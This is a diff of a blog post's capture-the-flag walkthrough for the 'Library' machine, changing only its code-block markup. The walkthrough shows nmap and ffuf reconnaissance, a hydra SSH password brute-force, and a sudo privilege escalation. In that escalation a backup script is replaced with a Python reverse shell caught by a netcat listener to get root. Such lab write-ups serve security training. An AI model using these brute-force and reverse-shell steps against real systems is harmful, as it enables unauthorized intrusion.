@@ -26,8 +26,7 @@ Library was made for BSides Guatemala CTF.  Fair enough.
 
 Let's run nmap to get a list of the services running on top ports.
 
-{% raw %}
-```bash
+{% capture nmap %}
 root@ip-10-10-22-36:~# sudo nmap -sV -sC -O -A -oN nmap 10.10.11.208
 Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-10 11:31 GMT
 Nmap scan report for 10.10.11.208
@@ -58,14 +57,13 @@ HOP RTT     ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 10.34 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Run nmap's vuln category scripts.  I like to look for low-hangin fruit.  Why not?
 
-{% raw %}
-```bash
+{% capture vulnchk %}
 root@ip-10-10-22-36:~# nmap --script vuln -oN vulnchk 10.10.11.208
 Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-10 11:32 GMT
 Nmap scan report for 10.10.11.208
@@ -107,14 +105,13 @@ PORT   STATE SERVICE
 MAC Address: 02:50:6E:3C:E3:7D (Unknown)
 
 Nmap done: 1 IP address (1 host up) scanned in 321.82 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=vulnchk %}
 
 <br />
 Whenever I see a web server, I like to curl -I to pull the headers and maybe identify some technologies.
 
-{% raw %}
-```bash
+{% capture curli %}
 root@ip-10-10-22-36:~# curl -I 10.10.11.208
 HTTP/1.1 200 OK
 Date: Mon, 10 Mar 2025 11:38:56 GMT
@@ -125,8 +122,8 @@ Accept-Ranges: bytes
 Content-Length: 5439
 Vary: Accept-Encoding
 Content-Type: text/html
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curli %}
 
 <br />
 Check the landing page the webserver is serving.  Library was made for BSides Guatemala.
@@ -140,10 +137,7 @@ Check the landing page the webserver is serving.  Library was made for BSides Gu
 <br />
 Check the source code for the landing page.  Might find some interesting comments or something.  Worth a checky-check.
 
-{% raw %}
-```html
-view-source:http://10.10.11.208/
-
+{% capture landingpage %}
 <!doctype html>
 <html lang="en">
 <head>
@@ -182,20 +176,17 @@ view-source:http://10.10.11.208/
 	</footer>
 </body>
 </html>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='view-source:http://10.10.11.208/' content=landingpage %}
 
 <br />
 And, of course, give the robots.txt a lookey-loo.
 
-{% raw %}
-```bash
-http://10.10.11.208/robots.txt
-
+{% capture robotstxt %}
 User-agent: rockyou 
 Disallow: /
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='http://10.10.11.208/robots.txt' content=robotstxt %}
 
 <br />
 Check the images directory from the vulnchk just because we can.
@@ -209,8 +200,7 @@ Check the images directory from the vulnchk just because we can.
 <br />
 Give the web server a ffuf to see what we have available to us.
 
-{% raw %}
-```bash
+{% capture ffufhtml %}
 root@ip-10-10-22-36:~# ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.208/FUZZ -e .txt,.bak,.html -fs 5439
 
         /'___\  /'___\           /'___\       
@@ -241,14 +231,13 @@ robots.txt              [Status: 200, Size: 33, Words: 4, Lines: 2]
 .html                   [Status: 403, Size: 292, Words: 22, Lines: 12]
 server-status           [Status: 403, Size: 300, Words: 22, Lines: 12]
 :: Progress: [882240/882240] :: Job [1/1] :: 10508 req/sec :: Duration: [0:02:32] :: Errors: 0 ::
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ffufhtml %}
 
 <br />
 Now, if we take the name from the post in the landing page screenshot (meliodas) and using the rockyou, since it mentioned it in the robots.txt, we can use hydra against the ssh port that is also open.
 
-{% raw %}
-```bash
+{% capture hydra %}
 root@ip-10-10-188-166:~# hydra -l meliodas -P /usr/share/wordlists/rockyou.txt -t 4 10.10.11.208 ssh
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -262,14 +251,13 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-10 12:01:
 [22][ssh] host: 10.10.11.208   login: meliodas   password: iloveyou1
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-10 12:09:19
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=hydra %}
 
 <br />
 And with that, we can now ssh into the machine.
 
-{% raw %}
-```bash
+{% capture sshmeliodas %}
 root@ip-10-10-188-166:~# ssh meliodas@10.10.11.208
 The authenticity of host '10.10.11.208 (10.10.11.208)' can't be established.
 ECDSA key fingerprint is SHA256:sKxkgmnt79RkNN7Tn25FLA0EHcu3yil858DSdzrX4Dc.
@@ -283,14 +271,13 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
  * Support:        https://ubuntu.com/advantage
 Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
 meliodas@ubuntu:~$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sshmeliodas %}
 
 <br />
 Let's snag the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 meliodas@ubuntu:~$ cat user.txt
 <redacted>
 meliodas@ubuntu:~$ ip a
@@ -306,28 +293,26 @@ meliodas@ubuntu:~$ ip a
        valid_lft forever preferred_lft forever
     inet6 fe80::50:6eff:fe3c:e37d/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Time to run the sudo -l to see the command this user can run as sudo.
 
-{% raw %}
-```bash
+{% capture sudol %}
 meliodas@ubuntu:~$ sudo -l
 Matching Defaults entries for meliodas on ubuntu:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User meliodas may run the following commands on ubuntu:
     (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sudol %}
 
 <br />
 Ls the home directory to see what we are working with.
 
-{% raw %}
-```bash
+{% capture lsla %}
 meliodas@ubuntu:~$ ls -la
 total 40
 drwxr-xr-x 4 meliodas meliodas 4096 Aug 24  2019 .
@@ -341,14 +326,13 @@ drwxrwxr-x 2 meliodas meliodas 4096 Aug 23  2019 .nano
 -rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile
 -rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
 -rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=lsla %}
 
 <br />
 Cat the python file that was indicated in the sudo command.
 
-{% raw %}
-```python
+{% capture bakpy %}
 #!/usr/bin/env python
 import os
 import zipfile
@@ -362,14 +346,13 @@ if __name__ == '__main__':
     zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
     zipdir('/var/www/html', zipf)
     zipf.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='bak.py' content=bakpy %}
 
 <br />
 Try running the script with the sudo.  Why not.
 
-{% raw %}
-```bash
+{% capture runthesudoscript %}
 meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py 
 meliodas@ubuntu:~$ ls /var/backups
 apt.extended_states.0  website.zip
@@ -379,18 +362,17 @@ drwxr-xr-x  2 root root  4096 Aug 24  2019 .
 drwxr-xr-x 12 root root  4096 Aug 24  2019 ..
 -rw-r--r--  1 root root 15347 Aug 24  2019 apt.extended_states.0
 -rw-r--r--  1 root root 31089 Mar 10 05:26 website.zip
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runthesudoscript %}
 
 <br />
 Remove the bak.py file.
 
-{% raw %}
-```bash
+{% capture rmbakpy %}
 meliodas@ubuntu:~$ rm -rvf bak.py 
 removed 'bak.py'
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rmbakpy %}
 
 <br />
 Use the revshells to generate the a payload.
@@ -405,8 +387,7 @@ Use the revshells to generate the a payload.
 <br />
 Create a bak.py file that replaces the one that we deleted earlier.  The file should contain the code from the revshells.
 
-{% raw %}
-```python
+{% capture updbakpy %}
 import socket,subprocess,os
 import pty
 
@@ -418,45 +399,41 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 
 pty.spawn("/bin/bash")
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='bak.py' content=updbakpy %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture start443listener %}
 root@ip-10-10-188-166:~# sudo nc -nlvp 443
 Listening on 0.0.0.0 443
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start443listener %}
 
 <br />
 Execute the script.
 
-{% raw %}
-```bash
+{% capture executenewscript %}
 meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=executenewscript %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchrootshell %}
 root@ip-10-10-188-166:~# sudo nc -nlvp 443
 Listening on 0.0.0.0 443
 Connection received on 10.10.78.155 36788
 root@ubuntu:~#
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchrootshell %}
 
 <br />
 Finally, grab the root trophy.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 root@ubuntu:~# cat /root/root.txt
 cat /root/root.txt
 <redacted>
@@ -474,8 +451,8 @@ ip a
        valid_lft forever preferred_lft forever
     inet6 fe80::80:25ff:fede:e99b/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 So, looks like no overdue fee for us since we cracked the library.  Hopefully, you enjoyed it.  See you in the next one.
